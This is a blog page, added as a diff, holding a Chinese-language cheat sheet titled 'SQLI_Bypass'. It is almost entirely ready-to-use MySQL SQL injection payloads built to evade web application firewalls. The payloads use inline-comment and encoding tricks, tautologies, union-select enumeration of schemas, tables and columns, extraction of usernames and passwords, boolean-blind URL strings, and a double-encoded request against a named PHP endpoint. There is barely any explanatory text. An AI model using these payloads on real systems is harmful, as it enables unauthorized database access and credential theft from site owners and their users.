@@ -1,0 +1,323 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>SQLI_Bypass | bo0s</title>
+  <meta name="author" content="hitman">
+  
+  <meta name="description" content="这是一个模版文件描述，以后就这么写✍️.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="SQLI_Bypass"/>
+  <meta property="og:site_name" content="bo0s"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/12favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.0.0"><link rel="stylesheet" href="/css/prism-vs.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">bo0s</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="全部文章">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="标签">
+			  <i class="fa fa-tag"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="我是谁.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/wiki/#/" title="WiKi.">
+			  <i class="fa fa-book"></i>WiKi
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="工具">
+			  <i class="fa fa-space-shuttle"></i>Tool
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/logs" title="日志">
+			  <i class="fa fa-tachometer"></i>Logs
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/code/landing/" title="Discord.JS Bot Code">
+			  <i class="fa fa-code"></i>Tutorials / Code
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> SQLI_Bypass</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> 这是一个模版文件描述，以后就这么写✍️.
+		 </div> <!-- alert -->
+	  		
+
+	  <h2 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 系统函数绕过</span><br><span class="line">version () #直接空格</span><br><span class="line">user%0a() #这个地方%0a~%20有很多，类似绕过空格</span><br><span class="line">database/**/() #注释符</span><br><span class="line">user/*!*/() #内敛注释</span><br><span class="line"></span><br><span class="line"># 函数名绕过</span><br><span class="line">/*!extractvalue/*!/*/**/*/</span><br><span class="line">/*!updatexml/*!/*/**/*/</span><br><span class="line"> </span><br><span class="line"># 针对两个关键字连用或者函数 </span><br><span class="line">/*!union/*!/*/**/*/select/**/</span><br><span class="line">/*!database/*!/*/**/*/()/**/</span><br><span class="line">/*!order/*!/*/**/*/by/**/</span><br><span class="line">#针对单独的一个关键字 </span><br><span class="line">/*!union/*!/*/**/*/ </span><br><span class="line">/*!updatexml/*!/*/**/*/ </span><br><span class="line">/*!extractvalue/*!/*/**/*/</span><br><span class="line">&#x27; order/*!60000f(100w+脏数据)*/by 1--+</span><br></pre></td></tr></table></figure>
+<a id="more"></a> 
+
+<h2 id="or"><a href="#or" class="headerlink" title="or"></a>or</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">or &#x27;1</span><br><span class="line">|| &#x27;1</span><br><span class="line">1&#x27; or -1=-1-- -</span><br><span class="line">1&#x27; or -0=-0-- -</span><br><span class="line">1&#x27; or /*!1=1*/-- -</span><br><span class="line">null&#x27; || &#x27;a&#x27;=_binary&#x27;a</span><br><span class="line">1&#x27; || &#x27;a&#x27;=x&#x27;61</span><br><span class="line">1&#x27; &amp;&amp; &#x27;0&#x27;=x&#x27;30</span><br><span class="line">1&#x27; || 1 like 1</span><br><span class="line">1&#x27; || 2 not like 1</span><br><span class="line">1 or 20!=&#x27;1&#x27;</span><br><span class="line">1&#x27; or 12 rlike &#x27;1</span><br><span class="line">1&#x27; %26 1-- -</span><br><span class="line">1&#x27; %26 0-- -</span><br><span class="line">1&#x27; and %26%26 True--+</span><br><span class="line">1&#x27; and %26%26 False--+</span><br><span class="line">1&#x27; Xor 1-- -</span><br><span class="line">1&#x27; Xor true-- -</span><br><span class="line">1&#x27; or length(database()=4)-- -</span><br><span class="line">1&#x27; %26 (length(database/**/())=4)-- -</span><br><span class="line">1&#x27; %26 (ascii(@@version)=53)-- -</span><br><span class="line"># 这个数值主要是需要遍历版本号确定</span><br><span class="line">/*!11440OR*/</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27; /*!order*//**//*!by*/ 1--+ </span><br><span class="line">&#x27; order/*!60000f100w+*/by 1--+</span><br><span class="line">&#x27; /*!order /*!/*/**/by*/1-- -</span><br><span class="line">&#x27; /*!order /*/*%/**/by*/1-- -</span><br><span class="line">&#x27; /*!order /*!/*/**//**/by*/1-- -</span><br><span class="line">&#x27; /*!order /*!/*/**//*/**/by*/1-- -</span><br></pre></td></tr></table></figure>
+
+<h2 id="union-select"><a href="#union-select" class="headerlink" title="union select"></a>union select</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union all%23 select 1,2,3--+</span><br><span class="line">&#x27; union/*!60000f1000w+*/select 1,2,3--+</span><br><span class="line">&#x27; /*!union/*!/*/**/*/select/**/1,2,3-- -</span><br><span class="line">&#x27; union/*!60000f1000w+*/select 1,database(),3--+</span><br><span class="line">&#x27; union/*!60000f1000w+*/select 1,(database/**/()),3--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="schema-name"><a href="#schema-name" class="headerlink" title="schema_name"></a>schema_name</h2> <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union/*!60000f1000w+*/select 1, (select group_concat(/*!schema_name*/) from information_schema.schemata),3--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="table-name"><a href="#table-name" class="headerlink" title="table_name"></a>table_name</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union/*!60000f1000w+*/select 1,(select group_concat(/*!table_name*/) from information_schema.tables where table_schema=&#x27;bypass&#x27;),3--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="column-name"><a href="#column-name" class="headerlink" title="column_name"></a>column_name</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union/*!60000ghtwf01*/select 1,(select group_concat(/*!column_name*/) from information_schema.columns where table_schema=&#x27;bypass&#x27; %26%26 table_name=0x7573657273),3--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="from"><a href="#from" class="headerlink" title="from"></a>from</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union/*!60000ghtwf01*/select 1, (select group_concat(username,0x7e,password,0x7e) from. users),3--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 数据库长度</span><br><span class="line">&#x27; %26%26 length(database/**/())=8--+</span><br><span class="line"></span><br><span class="line"># 数据库第一个字母</span><br><span class="line">%27%20%26%26%20(hex(substr((select%20concat(/*!schema_name*/)%20from%20information_schema.schema</span><br><span class="line">ta%20limit%200,1),1,1))=69)%20--+</span><br><span class="line"></span><br><span class="line"># 表名第一个字母</span><br><span class="line">%27%20%26%26%20(hex(substr((select%20concat(/*!table_name*/)%20from%20information_schema.tables%</span><br><span class="line">20where%20/*!table_schema*/=0x7365637572697479%20limit%200,1),1,1))=65)%20--+</span><br><span class="line"></span><br><span class="line"># 列名第一个字母</span><br><span class="line">%27%20%26%26%20(hex(substr((select%20concat(/*!column_name*/)%20from%20information_schema.column</span><br><span class="line">s%20where%20table_schema=0x7365637572697479%20%26%26%20table_name=0x7573657273%20limit%200,1),1,1))=</span><br><span class="line"><span class="attribute">69)%20--+</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"># 字段第一个字母</span><br><span class="line">%27%20%26%26%20(hex(substr((select%20username%20from.%20users%20limit%200,1),1,1))=74)%20--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">benchmark()</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="双重编码"><a href="#双重编码" class="headerlink" title="双重编码"></a>双重编码</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 被WAF拦截的请求</span><br><span class="line">/residetails.php?id=6145081 union select 1111,1222,1333&amp;premflag=&amp;searchcat=buy</span><br><span class="line"></span><br><span class="line"># 双重编码</span><br><span class="line">/residetails.php?id=6145081%2b%2575%256e%2569%256f%256e%2b%2573%2545%256c%2545%2563%2574%2b0x3133333731,1222,1333&amp;premflag=&amp;searchcat=buy</span><br></pre></td></tr></table></figure>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/post/SQLI_Bypass/" class="leancloud-visitors view" data-flag-title="SQLI_Bypass">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/post/内网横向/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/post/XSS_Bypass/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-05-02 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/反诈打击/">反诈打击<span>71</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/刷单类/">刷单类<span>7</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0"><span class="toc-article-text">系统函数</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#or"><span class="toc-article-text">or</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#order-by"><span class="toc-article-text">order by</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#union-select"><span class="toc-article-text">union select</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#schema-name"><span class="toc-article-text">schema_name</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#table-name"><span class="toc-article-text">table_name</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#column-name"><span class="toc-article-text">column_name</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#from"><span class="toc-article-text">from</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-article-text">布尔盲注</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#sleep"><span class="toc-article-text">sleep</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%8C%E9%87%8D%E7%BC%96%E7%A0%81"><span class="toc-article-text">双重编码</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 hitman's Blog
+  
+      . wubba <a href="http://hexo.io/" target="_blank">lubba</a> dub <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank"> dub.</a>  
+</p>
+
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
